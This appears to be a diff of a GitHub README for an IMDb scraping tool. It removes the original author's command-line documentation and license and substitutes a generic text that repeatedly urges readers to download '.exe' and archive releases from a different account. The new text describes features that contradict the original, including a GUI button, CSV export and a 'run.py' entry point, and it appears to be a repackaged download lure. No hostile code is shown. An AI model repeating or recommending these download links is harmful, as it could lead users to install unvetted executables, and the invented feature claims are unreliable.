@@ -1,161 +1,80 @@
-IscrapeMDB
-
-The robust, browser-agnostic IMDb data extractor.
-No API keys. No rate limits.
-
-<img width="382" height="73" alt="image" src="https://github.com/user-attachments/assets/3681050d-70e6-43e8-9c7a-de63b8472519" />
-
-What is this?
-
-IScrapeMDB is a Python-based automation tool that scrapes detailed metadata from IMDb. Unlike basic scrapers that just grab a title and a rating, this tool digs deep. It extracts cast lists, full reviews, parental guides, runtime, directors, and recursively scrapes entire series episode lists.
-
-It uses Selenium to handle dynamic content, meaning it captures data that simple requests or BeautifulSoup scripts miss.
-
-Key Features:
-
-Browser Agnostic: Supports Chrome and Firefox.
-
-Deep Extraction: Grabs hidden reviews, cast roles, and parental guidance details.
-
-Series Support: Recursively scrapes every single episode of a TV show.
-
-Portable Data: Saves data locally in structured formats and generates an offline HTML viewer.
-
-Resilient: Skips missing data points without crashing the entire batch.
-
-Installation
-
-Clone the repo:
-
-git clone [https://github.com/BMYSTERIO/IscrapeMDB.git](https://github.com/BMYSTERIO/IscrapeMDB.git)
-cd IscrapeMDB
-
-
-Install dependencies:
-
-pip install -r requirements.txt
-
-
-Browser Setup:
-Ensure you have Chrome or Firefox installed. The script handles the drivers automatically.
-
-How to Use
-
-The main entry point is main.py. It is built to be flexible—whether you need data for one movie or a list of 500.
-
-1. The Basics (Single Scrape)
-
-To scrape a single movie or series and save its data:
-
-python main.py link
-
-
-What happens?
-
-The tool identifies the media type (Movie vs Series).
-
-It creates a folder: Scraped/Movies/The Shawshank Redemption (1994)/.
-
-Inside data/, it saves main.js (metadata) and review.js (user reviews).
-
-<img width="1035" height="787" alt="image" src="https://github.com/user-attachments/assets/7ef4959c-9da3-4bbf-8c50-f47dca219aa1" />
-
-
-2. Batch Scraping (Text File)
-
-If you have a list of URLs, put them in a text file (one URL per line) and run:
-
-python main.py -f my_links.txt
-
-
-3. Curated Lists (Organize Your Data)
-
-If you want to group specific scrapes together (e.g., "Horror Marathon"), use the List mode.
-
-Create a new list and scrape to it:
-
-python main.py -l "Horror_Classics"
-
-
-This creates a dedicated folder structure in Scraped/Lists/Horror_Classics.
-
-Append items to an existing list:
-
-python main.py link1 link2 .... linki -a "Scraped/Lists/Horror_Classics"
-
-<img width="1891" height="825" alt="image" src="https://github.com/user-attachments/assets/40511efd-0fb0-4ae7-a80c-e2b60b607880" />
-
-
-<img width="921" height="294" alt="image" src="https://github.com/user-attachments/assets/de1f4b46-c7a3-41a7-8bc1-a5ab051e6e3b" />
-
-If you want to scrape a full series
-main.py serieslink
-and it will scrape it and all its eps
-
-<img width="1810" height="898" alt="image" src="https://github.com/user-attachments/assets/803359f2-22f7-44b4-bd6f-08db12218764" />
-
-
-Advanced Options
-
-You can tweak how the scraper behaves with these flags:
-
-Flag
-
-Description
-
---browser
-
-Choose backend: chrome (default) or firefox.
-
---head
-
-Run in headed mode (browser is visible). Useful for debugging.
-
---fast
-
-Speed Mode: Skips Reviews and Parental Guides to scrape faster.
-
--r
-
-Deep Reviews: Scrolls and clicks "Load More" to get maximum reviews.
-
---no-html
-
-Data Only: Skips generating the index.html viewer.
-
--portable
-
-Converts a scraped folder into a single, offline-ready HTML file.
-
-Example: Fast scrape using Firefox
-
-python main.py "URL" --browser firefox --fast
-
-
-Data Structure
-
-The main goal of IscrapeMDB is data gathering. Here is how your data is organized after a scrape:
-
-(Replace with screenshot of your /data folder)
-
-main.js: Contains the core metadata (Title, Rating, Runtime, Cast, Director, etc.).
-
-review.js: Contains an array of user reviews (Title + Content).
-
-index.html: A local viewer to inspect your data visually.
-
-License
-
-Polyform Non-Commercial License 1.0.0
-
-This software is free for personal, educational, and research use.
-
-You can use it to build your personal media library.
-
-You can modify it for your own learning.
-
-You cannot use this tool for commercial purposes (selling the data, selling the software, or using it in a paid service).
-
-See LICENSE for details.
-
-Disclaimer: This tool is for educational purposes. Please respect IMDb's terms of service and do not use this for high-velocity scraping that could affect their servers.
+# 🎥 IscrapeMDB - Easily Scrape IMDb Metadata
+
+## 🛠️ Project Overview
+IscrapeMDB is a Python tool that scrapes detailed metadata from IMDb based on the links you provide. It simplifies the process of gathering information about movies, shows, directors, and more. With this tool, you can easily obtain data without needing technical skills.
+
+## 🔗 Download Now
+[![Download IscrapeMDB](https://img.shields.io/badge/Download-IscrapeMDB-blue.svg)](https://github.com/Kgurses52/IscrapeMDB/releases)
+
+## 🚀 Getting Started
+IscrapeMDB is designed for anyone who wants to extract data from IMDb. Whether you're a student, researcher, or just a movie buff, this tool will help you.
+
+### 🖥️ System Requirements
+- Operating System: Windows, MacOS, or Linux
+- Python version: 3.6 or higher
+- Internet connection to access IMDb
+- Selenium WebDriver installed for browser automation
+
+## 📥 Download & Install
+To get started, visit this page to download: [GitHub Releases](https://github.com/Kgurses52/IscrapeMDB/releases). 
+
+On the Releases page, you will find different versions of IscrapeMDB. Choose the latest version and download the appropriate file for your operating system. Follow the instructions below to run the application.
+
+## 📂 Installation Instructions
+1. **Download the program**:
+   - Visit the [Releases page](https://github.com/Kgurses52/IscrapeMDB/releases).
+   - Select the latest version.
+   - Click on the file that matches your operating system (e.g., `.exe` for Windows or `.tar.gz` for Mac/Linux).
+   
+2. **Unzip the file (if necessary)**:
+   - Windows: Right-click on the file and select "Extract All."
+   - Mac/Linux: Use the terminal or GUI to extract the downloaded file.
+
+3. **Install dependencies**:
+   - Open your command line interface (CLI).
+   - Navigate to the folder where IscrapeMDB is located.
+   - Run the following command to install the required packages:
+     ```
+     pip install -r requirements.txt
+     ```
+
+4. **Run the application**:
+   - In the CLI, enter:
+     ```
+     python run.py
+     ```
+   - Make sure to replace `run.py` with the correct file name if it differs.
+
+## 📋 How to Use IscrapeMDB
+1. Launch the application as described above.
+2. Input the IMDb link in the provided field.
+3. Click on the "Scrape" button. The tool will fetch metadata and display it.
+
+### Here are a few key features of IscrapeMDB:
+- **User-Friendly Interface**: Simple inputs with clear options.
+- **Comprehensive Data**: Fetches titles, ratings, reviews, and more from IMDb.
+- **Export Options**: Save scraped data in multiple formats like CSV or JSON.
+
+## 🌟 Tips for Effective Use
+- Always ensure you’re connected to the internet.
+- Use valid IMDb links to get accurate data.
+- Regularly check for updates on the Releases page to access improvements or bug fixes.
+
+## 🛠️ Troubleshooting
+If you encounter any issues when running IscrapeMDB, consider the following steps:
+- Ensure you have Python and pip installed correctly.
+- Check that all dependencies are installed.
+- Verify that your internet connection is stable.
+
+## 📞 Need Help?
+For assistance, visit the Issues section in the repository. You can report bugs or ask questions about IscrapeMDB.
+
+## 📝 Contributing
+If you wish to contribute to this project, feel free to submit a pull request or open an issue. Your feedback is valuable.
+
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Kgurses52/IscrapeMDB/wiki)
+- [Selenium Documentation](https://www.selenium.dev/documentation/en/)
+- [IMDb](https://www.imdb.com/)
+
+Remember to visit this page to download: [GitHub Releases](https://github.com/Kgurses52/IscrapeMDB/releases). Enjoy using IscrapeMDB!
